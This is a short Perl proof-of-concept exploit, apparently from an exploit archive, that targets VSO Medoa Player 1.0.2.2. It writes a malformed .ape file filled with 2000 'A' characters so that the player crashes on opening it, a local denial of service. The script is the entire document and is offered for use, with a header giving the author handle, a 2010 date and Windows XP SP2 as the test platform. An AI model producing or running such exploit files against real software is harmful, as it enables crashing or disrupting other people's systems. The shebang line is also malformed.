#!usr/bin/perl
#Exploits title :[VSO Medoa Player Version 1.0.2.2 Local Denial Of Services poc]
#Date : [2010/01/02]
#Aouther : [SarBoT511]
#downloads :[www.vso-software.fr]
#tested on :[win xp sp2]
#VSO Medoa Player Version 1.0.2.2
 
 
$file="SarBoT511.ape";
$boom="A" x 2000;
open(myfile,">>$file");
print myfile $boom;
close(myfile);
print "Done ..! ~#";